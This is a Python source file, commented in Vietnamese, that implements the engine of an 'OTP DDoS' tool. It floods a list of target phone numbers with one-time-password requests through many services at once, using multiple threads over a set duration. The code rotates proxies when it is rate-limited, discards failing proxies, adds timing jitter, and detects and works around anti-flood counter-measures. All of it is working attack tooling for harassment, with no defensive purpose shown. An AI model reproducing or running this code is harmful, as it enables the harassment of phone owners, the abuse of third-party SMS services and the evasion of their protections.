#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
OTP DDoS Tool - DDoS Engine
Xử lý chính của engine tấn công DDoS
"""

import threading
import time
import random
from Services.proxy_manager import ProxyManager

class DDoSEngine:
    """Engine xử lý tấn công DDoS"""
    
    def __init__(self, phones, services, duration, thread_count=1, request_interval=1000,
                 use_proxy=False, proxy_list=None, services_instance=None, stats_manager=None,
                 log_callback=None, status_callback=None, completion_callback=None):
        """
        Khởi tạo engine
        
        Args:
            phones: Danh sách số điện thoại mục tiêu
            services: Danh sách dịch vụ
            duration: Thời gian chạy (giây)
            thread_count: Số lượng thread
            request_interval: Khoảng thời gian giữa các request (ms)
            use_proxy: Có sử dụng proxy không
            proxy_list: Danh sách proxy
            services_instance: Instance của OTPServices
            stats_manager: Quản lý thống kê
            log_callback: Callback để ghi log
            status_callback: Callback để cập nhật trạng thái
            completion_callback: Callback khi hoàn thành
        """
        self.phones = phones
        self.services = services
        self.duration = duration
        self.thread_count = max(1, thread_count)
        self.request_interval = max(100, request_interval)  # Tối thiểu 100ms
        
        self.use_proxy = use_proxy
        self.services_instance = services_instance
        self.stats_manager = stats_manager
        self.log_callback = log_callback
        self.status_callback = status_callback
        self.completion_callback = completion_callback
        
        # Proxy manager
        self.proxy_manager = ProxyManager(log_callback=self.log)
        if use_proxy and proxy_list:
            self.proxy_manager.add_proxies(proxy_list)
        
        # Trạng thái
        self.running = False
        self.active_threads = []
        self.start_time = None
        self.end_time = None
        
        # Thông tin cài đặt
        if self.stats_manager:
            self.stats_manager.set_settings({
                "thread_count": self.thread_count,
                "services_used": self.services,
                "proxy_enabled": self.use_proxy,
                "proxy_count": len(proxy_list) if proxy_list else 0,
                "targets": self.phones,
                "duration": self.duration
            })
    
    def log(self, message):
        """
        Ghi log
        
        Args:
            message: Thông điệp cần ghi
        """
        if self.log_callback:
            self.log_callback(message)
    
    def update_status(self, message):
        """
        Cập nhật trạng thái
        
        Args:
            message: Thông điệp trạng thái
        """
        if self.status_callback:
            self.status_callback(message)
    
    def start(self):
        """Bắt đầu tấn công"""
        if self.running:
            return
        
        self.running = True
        self.start_time = time.time()
        self.end_time = self.start_time + self.duration
        
        # Lưu thời gian bắt đầu
        if self.stats_manager:
            self.stats_manager.reset_stats()
        
        # Khởi chạy các thread
        for i in range(self.thread_count):
            thread_name = f"ddos-thread-{i+1}"
            thread = threading.Thread(
                target=self.attack_thread,
                args=(i,),
                name=thread_name,
                daemon=True
            )
            thread.start()
            self.active_threads.append(thread)
        
        # Thread giám sát
        monitor_thread = threading.Thread(
            target=self.monitor_thread,
            daemon=True
        )
        monitor_thread.start()
    
    def stop(self):
        """Dừng tấn công"""
        self.running = False
        
        # Kết thúc thống kê
        if self.stats_manager:
            self.stats_manager.end_session()
        
        # Gọi callback hoàn thành
        if self.completion_callback:
            self.completion_callback()
    
    def attack_thread(self, thread_id):
        """
        Thread tấn công
        
        Args:
            thread_id: ID của thread
        """
        while time.time() < self.end_time and self.running:
            # Chọn số điện thoại ngẫu nhiên từ danh sách
            phone = random.choice(self.phones)
            
            # Lấy proxy nếu cần
            proxy = None
            if self.use_proxy:
                proxy = self.proxy_manager.get_random_proxy()
            
            # Gửi request đến các dịch vụ
            for service in self.services:
                if not self.running or time.time() >= self.end_time:
                    break
                
                # Gửi request
                if self.services_instance and service in self.services_instance.services:
                    # Gọi dịch vụ
                    service_func = self.services_instance.services[service]
                    result = service_func(phone, proxy)
                    
                    # Phân loại kết quả
                    if "Rate Limited" in result:
                        if self.stats_manager:
                            self.stats_manager.record_request(success=False, ratelimited=True)
                        
                        # Thay đổi proxy nếu bị rate limit
                        if self.use_proxy:
                            proxy = self.proxy_manager.rotate_proxies()
                    elif "Thành công" in result:
                        if self.stats_manager:
                            self.stats_manager.record_request(success=True)
                    else:
                        if self.stats_manager:
                            self.stats_manager.record_request(success=False)
                        
                        # Đánh dấu proxy là hỏng nếu bị lỗi
                        if self.use_proxy and proxy:
                            self.proxy_manager.mark_proxy_failed(proxy)
                            proxy = self.proxy_manager.get_random_proxy()
                
                # Độ trễ giữa các request
                jitter = random.uniform(0.8, 1.2)  # ±20% jitter
                delay = self.request_interval / 1000 * jitter
                time.sleep(delay)
        
        # Kết thúc thread
        self.log(f"Thread {thread_id+1} kết thúc")
        
        # Kiểm tra hoàn thành
        if thread_id == 0 and self.running:
            self.running = False
            
            # Kết thúc thống kê
            if self.stats_manager:
                self.stats_manager.end_session()
            
            # Gọi callback hoàn thành
            if self.completion_callback:
                self.completion_callback()
    
    def monitor_thread(self):
        """Thread giám sát tiến trình"""
        while self.running:
            try:
                # Lấy thống kê hiện tại
                if self.stats_manager:
                    stats = self.stats_manager.get_stats()
                    elapsed = stats["elapsed_time"]
                    remaining = max(0, self.duration - elapsed)
                    rps = stats["requests_per_second"]
                    
                    # Cập nhật trạng thái
                    status = f"Đã gửi {stats['requests_count']} requests ({rps:.1f} r/s). Còn lại {int(remaining)} giây..."
                    self.update_status(status)
                
                # Phát hiện counter-measure
                if self.stats_manager and self.stats_manager.ratelimited_count > 20:
                    ratio = self.stats_manager.ratelimited_count / max(1, self.stats_manager.requests_count)
                    if ratio > 0.5:
                        self.log("⚠️ Phát hiện counter-measure chống DDoS! Thay đổi chiến thuật...")
                        
                        # Tăng khoảng thời gian giữa các request
                        self.request_interval *= 1.5
            except Exception as e:
                self.log(f"Lỗi trong monitor thread: {str(e)}")
            
            # Kiểm tra kết thúc
            if time.time() >= self.end_time:
                self.running = False
                
                # Kết thúc thống kê
                if self.stats_manager:
                    self.stats_manager.end_session()
                
                # Gọi callback hoàn thành
                if self.completion_callback:
                    self.completion_callback()
                
                break
            
            # Nghỉ giữa các lần cập nhật
            time.sleep(1)